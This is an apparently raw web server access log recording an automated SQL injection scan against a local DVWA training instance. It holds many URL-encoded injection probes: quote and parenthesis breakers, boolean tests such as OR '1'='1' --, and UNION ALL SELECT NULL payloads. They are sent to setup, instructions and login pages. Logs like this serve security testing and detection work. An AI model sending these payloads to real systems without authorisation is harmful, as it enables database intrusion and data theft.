172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/js/dvwaPage.js HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=%27 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query%27 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=%22 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query%22 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=%3B HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query%3B HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=%29 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query%29 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query+AND+1%3D1+--+ HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query+AND+1%3D2+--+ HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query+OR+1%3D1+--+ HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query+AND+1%3D2+--+ HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query+OR+1%3D1+--+ HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /favicon.ico HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=%27 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query%27 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=%3B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query%3B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=%29 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query%29 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query+AND+1%3D1+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query+AND+1%3D2+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query+OR+1%3D1+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query+AND+1%3D2+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query+OR+1%3D1+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /instructions.php HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:29 +0000] "GET /docs/DVWA_v1.3.pdf?query=%3B HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=%27 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license%27 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license%22 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=%3B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license%3B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=%29 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license%29 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license HTTP/1.1" 200 10862 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license HTTP/1.1" 200 10862 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license+AND+1%3D1+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license%22+AND+%221%22%3D%221%22+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license+AND+1%3D1 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license%27+AND+%271%27%3D%271 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license%22+AND+%221%22%3D%221 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 14324 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /instructions.php?doc=PHPIDS-license HTTP/1.1" 200 10862 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=%27 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=query%27 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=%22 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=query%22 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=%3B HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=query%3B HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=%29 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=query%29 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=query+AND+1%3D1+--+ HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=query%22+AND+%221%22%3D%221%22+--+ HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=query+AND+1%3D1 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=query%27+AND+%271%27%3D%271 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=query%22+AND+%221%22%3D%221 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:30 +0000] "GET /login.php?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
